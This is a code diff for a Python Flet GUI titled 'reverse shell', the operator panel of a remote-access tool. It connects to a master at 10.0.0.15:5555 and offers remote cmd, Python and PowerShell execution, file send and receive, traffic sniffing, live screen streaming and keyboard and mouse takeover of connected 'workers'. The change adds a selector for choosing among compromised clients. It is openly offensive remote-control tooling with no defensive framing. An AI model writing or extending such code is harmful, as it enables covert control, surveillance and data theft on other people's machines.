@@ -26,8 +26,8 @@ class App:
     def __init__(self):
         self.input_required_functions: dict[str,Callable[[],ft.AlertDialog]]= {"cmd" : self.cmd,"python":self.python,"powershell":self.powershell,"receive_file":self.receive_file,"send_file":self.send_file,"sniff_from_worker":self.sniff_from_worker}
         self.page: ft.Page | None = None
-        self.master = Master("10.0.0.12",5555)
-        self.master.connect()
+        self.master = Master("10.0.0.15",5555)
+        threading.Thread(target = self.master.connect, daemon=True).start()
         self.title = ft.Container(
             content=ft.Text("reverse shell", size=40, italic=True, weight=FontWeight.BOLD),
             alignment=ft.alignment.top_center,
@@ -43,7 +43,16 @@ class App:
             leading_icon=ft.Icons.SEARCH,
             label= "command",
             options= get_options(self.master.functions,"commends"),
-            on_change=self.choose_command
+            on_change=self.choose_command,
+            disabled=True
+        )
+        self.workers = ft.Dropdown(
+            enable_filter=True,
+            editable=True,
+            leading_icon=ft.Icons.SEARCH,
+            label="workers",
+            options=list(self.master.clients.keys()),
+            on_change=self.chosen_client
         )
         self.connected_worker=ft.DataTable(
             columns=[
@@ -66,24 +75,37 @@ class App:
 
         )
         self.exit = False
-        self.livestream = ft.Checkbox(label="live stream", on_change=self.live_steam_pressed)
-        self.control_keys = ft.Checkbox(label="control the keys of the worker", on_change=self.control_keys_pressed)
-        self.control_mouse = ft.Checkbox(label="control the mouse of the worker", on_change=self.control_mouse_of_worker)
+        self.livestream = ft.Checkbox(label="live stream", on_change=self.live_steam_pressed, disabled=True)
+        self.control_keys = ft.Checkbox(label="control the keys of the worker", on_change=self.control_keys_pressed, disabled=True)
+        self.control_mouse = ft.Checkbox(label="control the mouse of the worker", on_change=self.control_mouse_of_worker, disabled=True)
         self.master.on_stream_stop = self.live_stream_stopped
+        self.master.update_clients = self.update_clients
         self.dlg:ft.AlertDialog | None= None
         threading.Thread(target=self.master.show_stream, daemon=True).start()
         threading.Thread(target=self.master.control_keys,daemon=True).start()
         threading.Thread(target=self.master.control_mouse_on_worker, daemon=True).start()
 
 
+
+    def chosen_client(self, e):
+        self.control_mouse.disabled = False
+        self.control_keys.disabled = False
+        self.livestream.disabled = False
+        self.commands.disabled = False
+        self.master.address = self.workers.value
+        self.page.update()
     def control_mouse_of_worker(self,e):
         self.master.control_mouse = self.control_mouse.value
     def control_keys_pressed(self,e):
         self.master.control_key = self.control_keys.value
 
+    def update_clients(self):
+        self.workers.options = [ft.DropdownOption(key = key, content=ft.Text(key[0])) for key in self.master.clients.keys()]
+        self.page.update(self.workers)
+
     def live_stream_stopped(self):
-            self.livestream.value = False
-            self.page.update()
+        self.livestream.value = False
+        self.page.update()
 
     def live_steam_pressed(self,e):
         self.master.streaming = self.livestream.value
@@ -218,11 +240,12 @@ class App:
                                               vertical_lines=ft.BorderSide(color=ft.Colors.BLACK, width=1),
                                               horizontal_lines=ft.BorderSide(color=self.page.bgcolor, width=0),
                                               columns=[
-                                                   ft.DataColumn(self.commands),
+                                                   ft.DataColumn(self.workers),
 
 
                                                    ],
                                               rows=[
+                                                  ft.DataRow([ft.DataCell(self.commands)]),
                                                   ft.DataRow([ft.DataCell(self.livestream)]),
                                                   ft.DataRow([ft.DataCell(self.control_keys)]),
                                                   ft.DataRow([ft.DataCell(self.control_mouse)])
